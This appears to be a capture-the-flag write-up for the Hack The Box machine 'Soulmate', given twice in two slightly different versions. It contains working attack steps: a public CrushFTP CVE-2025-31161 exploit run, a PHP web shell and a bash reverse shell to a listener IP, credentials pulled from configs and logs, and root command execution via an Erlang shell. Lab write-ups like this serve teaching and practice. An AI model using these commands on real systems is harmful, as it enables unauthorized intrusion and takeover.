---
title: Hack The Box - Soulmate (2025) Writeup
date: 2025-09-15 18:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Soulmate
  - CrushFTP
  - CVE-2025-31161
  - Erlang
  - Port Forwarding
  - SSH Runner
---

# Soulmate (Hack The Box) - 2025

> “I almost filtered out the only useful subdomain because I was sick of false positives. This box really tested my patience.”

---

## 1. Recon: Death by Nmap Output

I kicked off with my usual Nmap scan. It took forever because I left the insane scripts enabled:

```bash
nmap -sV -A 10.10.11.86
```

Ports open:
- `22` – OpenSSH 8.9p1 (tons of scary CVEs listed but I told myself I wasn’t touching SSH in 2025)
- `80` – nginx 1.18.0

The website looked like one static landing page. dirsearch gave me the typical `/login.php`, `/register.php`, `/profile.php` but everything just redirected me back to `/login`. So yeah, nothing useful on the main domain.

I almost gave up and then remembered: “If I’m stuck, fuzz subdomains.”

```bash
ffuf -u http://soulmate.htb -H 'Host: FUZZ.soulmate.htb' \
     -w /snap/seclists/1078/Discovery/DNS/subdomains-top1million-5000.txt \
     -fw 4
```

Weird thing: every subdomain was returning the same response size. I was seconds away from killing the scan when I tried filtering with `-fw 4`. Suddenly:

```
ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Finally! `ftp.soulmate.htb` was alive.

---

## 2. FTP Panel & CrushFTP Shenanigans

Heading to `ftp.soulmate.htb` gave me a login page. Looked like CrushFTP (I recognized the UI from a YouTube video I watched).  
First instinct: default creds. Nope. SQLi? Nope. Dirsearch? Nothing.

So I Googled “CrushFTP vuln 2025” and… jackpot. **CVE-2025-31161** – auth bypass + account creation via path traversal.

Found a PoC here: <https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py>

Ran it like this:

```bash
python3 CVE-2025-31161.py \
  --target_host ftp.soulmate.htb --port 80 \
  --target_user root --new_user hyh --password admin123
```

Output said “User created successfully” so I tried logging in with `hyh / admin123` and it actually worked.  
From there, I saw a user named **ben** in the dashboard. Apparently you can just reset passwords. So I did.

Logged in as ben, got access to the file manager, and noticed I could upload files.  
Dropped a PHP reverse shell into one of the served directories:

```php
<?php system($_GET['cmd']); ?>
```

Started a listener:

```bash
nc -lvnp 4444
```

Triggered it:

```bash
curl "http://ftp.soulmate.htb/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'"
```

Shell popped as `www-data`, which felt both exciting and underwhelming. Back to enumeration.

---

## 3. Config Diving = Password Hoarder

Found the CrushFTP config files pretty quickly (their permissions were a joke). Inside, I saw:

```
Crush4dmin990
```

Looked like the admin password. Tried SSH with it (don’t ask why). No luck. Worked fine in the web portal, though.

Kept digging through logs and found this line referencing some Erlang login thing:

```
/usr/local/lib/erlang_login/start.escript ...
```

I was like “Why on earth is Erlang here??” but you know me, I love pain so I followed the rabbit hole.

Also stumbled upon another password in the logs:

```
HouseH0ldings998
```

Tried it with SSH and it actually let me in as ben:

```bash
ssh ben@soulmate.htb
```

Grabbed the user flag:

```
cat ~/user.txt
# Output: *********************
```

---

## 4. “Why is SSH Running on 2222?”

As usual, I tried the basic privesc tricks (sudo -l / SUID / find capabilities), but nothing interesting turned up.  
So I ran:

```bash
ss -tuln
```

And noticed a service listening on `127.0.0.1:2222`. Forwarded it with SSH:

```bash
ssh -N -L 2222:127.0.0.1:2222 ben@soulmate.htb
```

Then connected:

```bash
ssh -p 2222 ben@localhost
```

Instead of a shell, I landed in some Erlang environment called `ssh_runner`. I literally stared at it like “???”.  
Typed `help().` and it responded. Tried `os:cmd("id").` and it showed `uid=0(root)`.  
So yeah, this thing was running as root.

At first I tried to break out to bash but honestly, I didn’t need to. Erlang has built-in file commands.

---

## 5. Root Flag via Erlang

Inside the Erlang shell:

```erlang
cd("/root").
file:read_file("root.txt").
```

Response:

```
{ok,<<"*********************">>}
```

Game over. No need for a root shell when Erlang is basically letting me run anything.

---

## What I Learned (after lots of facepalming)

- **Don’t stop fuzzing subdomains just because the first 200 responses look the same.**
- **CrushFTP is a goldmine** if you catch it on a vulnerable version.
- **Erlang shells are weird but powerful** (and apparently people use them to guard root?).
- **Log files are secrets waiting to be stolen.**

> “Soulmate made me hate and appreciate Erlang at the same time.”

---

*This writeup is for educational purposes only. Always hack responsibly.*
---
title: Hack The Box - Soulmate (2025) Writeup
date: 2025-09-15 18:00:00
categories:
  - HackTheBox
  - Writeups
tags:
  - Soulmate
  - CrushFTP
  - CVE-2025-31161
  - Erlang
  - SSH Runner
---

# Soulmate (Hack The Box) - 2025

> “Sometimes the subdomain you almost filtered out is literally named **ftp**. Lesson learned.”

---

## 1. Recon Rollercoaster

Started with the usual:

```bash
nmap -sV -A 10.10.11.86
```

Main takeaways:
- `22/tcp` – OpenSSH 8.9p1 with a *mountain* of CVEs (but I decided not to go down that rabbit hole yet)
- `80/tcp` – nginx 1.18.0 serving a boring landing page

The web root was empty. dirsearch found auth pages like `/login.php`, `/register.php`, etc., but everything redirecting to login felt like a dead-end.

So I busted out ffuf for subdomains:

```bash
ffuf -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" \
     -w /snap/seclists/1078/Discovery/DNS/subdomains-top1million-5000.txt -fw 4
```

Every subdomain was getting the same response size, so filtering with `-fw 4` was critical. Finally hit one:
- `ftp.soulmate.htb`

Alright, new target unlocked.

---

## 2. CrushFTP and CVE-2025-31161

Visiting `ftp.soulmate.htb` showed a web login page. Based on the UI + behavior, I guessed it was CrushFTP. A quick search for CrushFTP CVEs turned up **CVE-2025-31161** – authentication bypass via path traversal.

GitHub PoC: [Immersive Labs script](https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py)

Ran it:

```bash
python3 CVE-2025-31161.py --target_host ftp.soulmate.htb \
  --port 80 --target_user root --new_user hyh --password admin123
```

And boom – created my own user (`hyh / admin123`). Logged into the CrushFTP panel immediately.

From the admin panel I spotted user **ben**. The UI allowed password resets, so I just... reset his password. Logged back out, in as ben, and checked his file system view.

Uploaded a PHP reverse shell into the served directory:

```php
<?php system($_GET['cmd']); ?>
```

Triggered it with curl while my listener was waiting:

```bash
nc -lvnp 4444
curl "http://ftp.soulmate.htb/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
```

Shell popped as `www-data`.

---

## 3. Credentials, Configs, and Finally SSH

From `/var/www/html` and nearby directories, I grabbed CrushFTP configs. Found the admin password sitting pretty:

```
Crush4dmin990
```

Tried it everywhere – web panel, SSH. No luck on SSH yet but kept the credential.

While digging further I noticed some custom Erlang stuff under `/usr/local/lib/erlang_login`. Also saw `ben`’s home directory. Eventually found logs containing an SSH password:

```
HouseH0ldings998
```

Tried SSH:

```bash
ssh ben@soulmate.htb
```

Success! Grabbed `user.txt`:

```
cat ~/user.txt
# Output: *********************
```

---

## 4. Weird Process, Weird Port

Couldn’t find obvious privilege escalation paths. No juicy SUID binaries, no sudo rights. So I listed processes:

```bash
ps aux | grep root
```

Saw something bizarre:

```
/usr/local/lib/erlang_login/start.escript ... -sname ssh_runner ...
```

Also noticed port `2222/tcp` listening. Tried SSH there:

```bash
ssh -p 2222 ben@soulmate.htb
```

Instead of a shell, I landed in an Erlang environment – some custom `ssh_runner` thing. Definitely not bash. Took me a sec to realize it was running as root.

---

## 5. Erlang Shenanigans → Root

Inside the Erlang shell, I experimented:

```erlang
help().
os:cmd("id").
```

Confirmed: running as root. Navigation was funky, but doable:

```erlang
cd("/root").
file:read_file("root.txt").
```

Output:

```
{ok,<<"*********************">>}
```

Flag secured! No need to escape to bash – reading files directly from Erlang was enough.

---

## Lessons Learned

- Don’t ignore weird subdomain fuzzing responses. Filtering was key.
- CrushFTP CVEs are wild. Creating a new admin user felt almost unfair.
- Erlang shells are bizarre but powerful. `os:cmd/1` is your friend.
- Always dump config files. People leave passwords everywhere.

> “Soulmate made me fall in love with Erlang. Kinda.”

---

*This writeup is for educational purposes only. Always hack responsibly.*
